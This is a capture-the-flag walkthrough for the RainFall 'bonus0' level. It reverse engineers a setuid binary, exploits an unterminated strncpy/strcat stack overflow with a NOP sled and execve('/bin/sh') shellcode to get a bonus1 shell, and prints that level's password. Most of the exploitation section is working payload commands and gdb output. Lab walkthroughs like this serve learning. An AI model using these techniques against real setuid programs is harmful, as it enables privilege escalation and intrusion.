# Rainfall Bonus 0 Guide
This guide will walk you through the process of finding the password for the `bonus1` user.

## 1. Examine your environment
   
`id` : Shows user and group identities that you have.
```bash
uid=2010(bonus0) gid=2010(bonus0) groups=2010(bonus0),100(users)
```
`pwd` : Displays the current directory you are in.
```bash
/home/user/bonus0
```
`ls -la` : Lists files and their permissions in the current directory.
```bash
-rwsr-s---+ 1 bonus1 users  5566 Mar  6  2016 bonus0
```

We can see that the `bonus0` binary has the `setuid` bit set, which means that it runs with the permissions of the owner of the file. In this case, the owner is `bonus1`. It executable by the `users` group, our current group.

We execute the binary to see what it does. It print ` - \n` and wait for an input.
We write an input, and it print ` - \n` again, and wait for another input.
We wrtie another input, and it print the two inputs separated by a space.
```bash
bonus0@RainFall:~$ ./bonus0 
 - 
test
 - 
testAgain
test testAgain
```

## 2. Reverse engineering

We will use Ghidra to reverse engineer the binary.
You can find the analysis in [Ressources/ghidra_analyse_bonus0.c](Ressources/ghidra_analyse_bonus0.c), and the reconstructed C code in [source.c](source.c).

## 3. Analysis

We found the main function, which calls the `pp` function with a buffer of 54 bytes,
then prints the buffer.
```c
int main(void)
{
    char buffer[54];

    pp(buffer);
    puts(buffer);
    return (0);
}
```
The `pp` function calls the `p` function twice with two buffers of 20 bytes. Then, it copies the first buffer into the parameter buffer, adds a space, and concatenates the second buffer.
```c
void pp(char *param_1)
{
    char buffer1[20];
    char buffer2[20];
    int len;
 
    p(buffer1, " - ");
    p(buffer2, " - ");
    strcpy(param_1,buffer1);
    len = strlen(param_1);
    param_1[len] = ' ';
    param_1[len + 1] = '\0';
    strcat(param_1,buffer2);
    return;
}
```
The `p` function reads 4096 bytes from the standard input, replaces the newline character with a null character, and copies the first 20 bytes into the first parameter.
```c
void p(char *param_1,char *param_2)
{
    char *pcVar1;
    char buffer[4104];
    
    puts(param_2);
    read(0, buffer, 4096);
    pcVar1 = strchr(buffer, '\n');
    *pcVar1 = '\0';
    strncpy(param_1, buffer, 20);
    return;
}
```
So this program reads two inputs from the user, and concatenates them with a space between them.

`strncpy` does not add a null character at the end of the string if the source string is longer than the destination string. Here, the program don't check if the source string is longer than 20 bytes, so we can overflow the buffer.

### Vulnerabilities

`p` copies the first 20 bytes into the buffer given as a parameter.
So after the second call to `p` :

- If the first input is smaller than 20 bytes, and the second input is smaller than 20 bytes, the first `strncpy` in `pp` copies char by char until the end of the first input `\0`. And the program will not crash.

- If the first input is smaller than 20 bytes, and the second input is longer than 20 bytes, the first `strncpy` in `pp` copies char by char until the end of the first input `\0`. The `strcat` in `pp` copies the second input until the end of the buffer, char by char. Here, the program may crash because the second input is not null-terminated, and `strcat` will continue to copy until it finds a null character. But in our case, the program does not crash because `strcat` find a null character.

- If the first input is longer than 20 bytes, and the second input is smaller than 20 bytes, the first `strncpy` in `pp` copies char by char until the end of the buffer.
In the stack, `buffer1` is followed by `buffer2`. So the first `strncpy` in `pp` copies the first 20 bytes of the first input into `buffer1`, and and continue to copy the next bytes into `buffer2` until the end of th `buffer2`. So the program will not crash.

- If the first input is longer than 20 bytes, and the second input is longer than 20 bytes, the first `strncpy` in `pp` copies char by char until the end of the buffer. But it doesn't find a null character.
The same for the `strcat`. I don't where the program crash in this case, but it crash.
And with `strncpy` or `strcat`, the second buffer overflows the buffer of the main function, and we can overwrite the EIP.
If it crash due to the `strncpy`, it's maybe because the `strncpy` `buffer1` without finding a null character, and `buffer1`, `buffer2` and the `p` `buffer` are in the same stack frame. So the `strncpy` continue to copy in main `buffer` and overwrite the EIP.
If it crash due to the `strcat`, it's maybe because the `strcat` copy `buffer2` without finding a null character. So the `strcat` continue to copy in main `buffer` and overwrite the EIP.

## 4. Exploitation

### 4.1. Find the offset of the EIP

As explained in the previous section, and after tests, we can overwrite the EIP with the second input.
For that, we need to overflow the first buffer, and then overflow the second buffer with a pattern to overwrite the EIP.
We generate a pattern with `Wiremask` and we run the program with the pattern as second input.
```bash
bonus0@RainFall:~$ gdb bonus0
(gdb) run
Starting program: /home/user/bonus0/bonus0 
 - 
123456789012345678901234567890
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
12345678901234567890Aa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
```
We can see that the EIP is overwritten with `0x41336141`. We can verify that:
```bash
(gdb) info registers eip
eip            0x41336141	0x41336141
```
`Wiremask` tells us that the offset is 9 bytes.

Now, we will find the address of the first input buffer to write the shellcode in it, and copy this address in the eip to execute the shellcode.

### 4.2. Find the address of the first input buffer

To find the address of the first input buffer, we will use the `gdb` debugger to disassemble the `p` function and find the address of the input buffer.
```bash
bonus0@RainFall:~$ gdb bonus0
(gdb) disas p
Dump of assembler code for function p:
   0x080484b4 <+0>:	push   %ebp
   0x080484b5 <+1>:	mov    %esp,%ebp
   0x080484b7 <+3>:	sub    $0x1018,%esp
   0x080484bd <+9>:	mov    0xc(%ebp),%eax
   0x080484c0 <+12>:	mov    %eax,(%esp)
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)
   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
   0x080484d6 <+34>:	mov    %eax,0x4(%esp)
   0x080484da <+38>:	movl   $0x0,(%esp)
   0x080484e1 <+45>:	call   0x8048380 <read@plt>
   0x080484e6 <+50>:	movl   $0xa,0x4(%esp)
   0x080484ee <+58>:	lea    -0x1008(%ebp),%eax
   0x080484f4 <+64>:	mov    %eax,(%esp)
   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:	movb   $0x0,(%eax)
   0x080484ff <+75>:	lea    -0x1008(%ebp),%eax
   0x08048505 <+81>:	movl   $0x14,0x8(%esp)
   0x0804850d <+89>:	mov    %eax,0x4(%esp)
   0x08048511 <+93>:	mov    0x8(%ebp),%eax
   0x08048514 <+96>:	mov    %eax,(%esp)
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
   0x0804851c <+104>:	leave  
   0x0804851d <+105>:	ret    
End of assembler dump.
```
We can see that `read` is called at `0x080484e1` address.
After the `read` call, we can see:
```bash
0x080484ee <+58>:	lea    -0x1008(%ebp),%eax
```
`eax` is used to store temporary values, and it is used to store the address of the buffer.
`lea` is used to load the effective address of the source operand into the destination operand.
`ebp` is the base pointer, and it points to the base of the stack frame.
`-0x1008` is the offset of the buffer from the base pointer.
So the address of the buffer is `ebp - 0x1008`.

So we can set a breakpoint just before this instruction, run the program, and examine the stack to find the address of the buffer.
The instruction before is:
```bash
   0x080484e6 <+50>:	movl   $0xa,0x4(%esp)
```
So we can set a breakpoint at `0x080484e6` address.
```bash
(gdb) break *0x080484e6
Breakpoint 1 at 0x80484e6
(gdb) run
Starting program: /home/user/bonus0/bonus0 
 - 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Breakpoint 1, 0x080484e6 in p ()
```
We are at the breakpoint, just after the read call. We can examine the stack to find the address of the buffer.
```bash
(gdb) info registers
eax            0x1f	31
ecx            0xbfffe680	-1073748352
edx            0x1000	4096
ebx            0xb7fd0ff4	-1208152076
esp            0xbfffe670	0xbfffe670
ebp            0xbffff688	0xbffff688
esi            0x0	0
edi            0x0	0
eip            0x80484e6	0x80484e6 <p+50>
eflags         0x200207	[ CF PF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```
If we examine the stack at `ebp - 0x1008`, we can see the buffer.
```bash
(gdb) x/20x $ebp-0x1008
0xbfffe680:	0x61616161	0x61616161	0x61616161	0x61616161
0xbfffe690:	0x61616161	0x61616161	0x61616161	0x000a6161
0xbfffe6a0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe6b0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe6c0:	0x00000000	0x00000000	0x00000000	0x00000000
```
`x/20x` : Examine 20 words of memory at the address.
`$ebp-0x1008` : The address of the buffer.

We can see that the buffer is filled with `0x61` (ASCII for `a`), and the last byte is `0x0a` (ASCII for `\n`), and it starts at the address `0xbfffe680`.

#### With EAX

We can find the address of the buffer with `eax` too, because `eax` is used to store temporary values, and it is used to store the address of the buffer in our case.
```bash
0x080484ee <+58>:	lea    -0x1008(%ebp),%eax
0x080484f4 <+64>:	mov    %eax,(%esp)
```
We can set a breakpoint just after the `lea` instruction, run the program, and examine the stack to find the address of the buffer.
```bash
(gdb) break *0x080484f4
Breakpoint 1 at 0x80484f4
(gdb) run
Starting program: /home/user/bonus0/bonus0 
 - 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Breakpoint 1, 0x080484f4 in p ()
(gdb) info registers
eax            0xbfffe680	-1073748352
ecx            0xbfffe680	-1073748352
edx            0x1000	4096
ebx            0xb7fd0ff4	-1208152076
esp            0xbfffe670	0xbfffe670
ebp            0xbffff688	0xbffff688
esi            0x0	0
edi            0x0	0
eip            0x80484f4	0x80484f4 <p+64>
eflags         0x200207	[ CF PF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x/20x $eax
0xbfffe680:	0x61616161	0x61616161	0x61616161	0x61616161
0xbfffe690:	0x61616161	0x61616161	0x61616161	0x61616161
0xbfffe6a0:	0x61616161	0x0000000a	0x00000000	0x00000000
0xbfffe6b0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe6c0:	0x00000000	0x00000000	0x00000000	0x00000000
```
We can see that the buffer is filled with `0x61` (ASCII for `a`), and the last byte is `0x0a` (ASCII for `\n`), and it starts at the address `0xbfffe680`.


So our buffer address is `0xbfffe680`.
Now, we can write the shellcode in the buffer, and copy this address in the EIP to execute the shellcode.

### 4.3. Write the shellcode

We will write a shellcode that will execute a shell.
We will use the following shellcode:
```c
execve("/bin/sh")
```
In machine language:
```c
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```
We will write our command in a file.
```bash
python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"' > /tmp/first
```

### 4.4. Overwrite the EIP

We will overwrite the EIP with the address of the buffer.
The address of the buffer is `0xbfffe680`, `\x80\xe6\xff\xbf` in little-endian.
We know that the offset is 9 bytes, the address of the buffer has 4 bytes, so we need to add 7 bytes to reach the EIP.
```bash
python -c 'print "A" * 9 + "\x80\xe6\xff\xbf" + "A" * 7' > /tmp/second
```

### 4.5. Run the exploit

We will run the program with the first input as our shellcode, and the second input as the overwrite of the EIP.
```bash
(cat /tmp/first; cat /tmp/second; cat) | ./bonus0
 - 
 - 
j
 X�Rh//shh/bin��1��AAAAAAAAA����AAAAAAA��� AAAAAAAAA����AAAAAAA���
whoami
Illegal instruction (core dumped)
```

We can see that the program crashes with an illegal instruction.
`Illegal instruction` means that the program tried to execute a not valid instruction, or try to access a not valid memory address.

Maybe the address of the buffer is not really exact.
So we will add some `NOP` instructions before the shellcode to make sure that the shellcode is executed. If the good address is after the address we used, the `NOP` instructions will be executed, and the shellcode will be executed.
`NOP` is `0x90` in machine language.
```bash
python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"' > /tmp/first
```

We try again:
```bash
bonus0@RainFall:~$ (cat /tmp/first; cat /tmp/second; cat) | ./bonus0
 - 
 - 
��������������������AAAAAAAAA����AAAAAAA��� AAAAAAAAA����AAAAAAA���
whoami
Illegal instruction (core dumped)
```

Now, with the `NOP` instructions, we can shift the address to be in the `NOP` instructions, and the shellcode will be executed.
If we add 64 octets at the address of the buffer:
`0xbfffe680 + 64 = 0xbfffe6c0 = \xc0\xe6\xff\xbf`
```bash
python -c 'print "A" * 9 + "\xc0\xe6\xff\xbf" + "A" * 7' > /tmp/second
```
```bash
bonus0@RainFall:~$ (cat /tmp/first; cat /tmp/second; cat) | ./bonus0
 - 
 - 
��������������������AAAAAAAAA����AAAAAAA��� AAAAAAAAA����AAAAAAA���
whoami
Segmentation fault (core dumped)
```

If we add 86 octets at the address of the buffer:
`0xbfffe680 + 86 = 0xbfffe6d0 = \xd0\xe6\xff\xbf`
```bash
python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "A" * 7' > /tmp/second
```
```bash
bonus0@RainFall:~$ (cat /tmp/first; cat /tmp/second; cat) | ./bonus0
 - 
 - 
��������������������AAAAAAAAA����AAAAAAA��� AAAAAAAAA����AAAAAAA���
whoami
bonus1
```

You opened a shell as the `bonus1` user !

```bash
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

Congratulations!
We can now connect to the `bonus1` user with this password.
```bash
bonus0@RainFall:~$ su bonus1
Password:
bonus1@RainFall:~$
```

Notes:

Simple method. If you write more than 20 bytes in the first input, and more than 20 bytes in the second input, `strcpy(param_1,buffer1);` will write undefined bytes in the buffer, maybe `param_2` also. And the `strcat` will write undefined bytes in the buffer. So we overflow the buffer of the main function, and we can overwrite the EIP.

First input:
```bash
01234567890123456789
```
Second input:
```bash
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```
```bash
(gdb) info registers
...
eip            0x41336141	0x41336141
...
```
We can see that the EIP is overwritten with `0x41336141`, so the offset is 9 bytes.

Now, we will find the address of the `p` buffer.
```bash
(gdb) disass p
Dump of assembler code for function p:
...
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)
   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
   0x080484d6 <+34>:	mov    %eax,0x4(%esp)
   0x080484da <+38>:	movl   $0x0,(%esp)
   0x080484e1 <+45>:	call   0x8048380 <read@plt>
   0x080484e6 <+50>:	movl   $0xa,0x4(%esp)
...  
End of assembler dump.
(gdb) 
```
We can see `lea` wich load the address of the buffer in `eax`. So the buffer adress is `ebp - 0x1008`.
So we can set a breakpoint just before the `lea` instruction, run the program, and examine the stack to find the address of the buffer.
```bash
(gdb) break *0x80484d0
Breakpoint 1 at 0x80484d0
(gdb) run
Starting program: /home/user/bonus0/bonus0 
 - 

Breakpoint 1, 0x080484d0 in p ()
(gdb) x $ebp-0x1008
0xbfffe680:	0x00000000
```
The address of the buffer is `0xbfffe680`.

So we want write the shellcode in the buffer, and copy the address of the buffer in the EIP to execute the shellcode.

First argument:
```bash
python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"' > /tmp/first
```
For the second argument, we take the address of the buffer, and we add 80 bytes to be sure that the shellcode is executed (with `NOP` instructions). So we take `0xbfffe6d0` -> `\xd0\xe6\xff\xbf`.
Second argument:
```bash
python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "A" * 7' > /tmp/second
```

We run the program:
```bash
(cat /tmp/first; cat /tmp/second; cat) | ./bonus0
```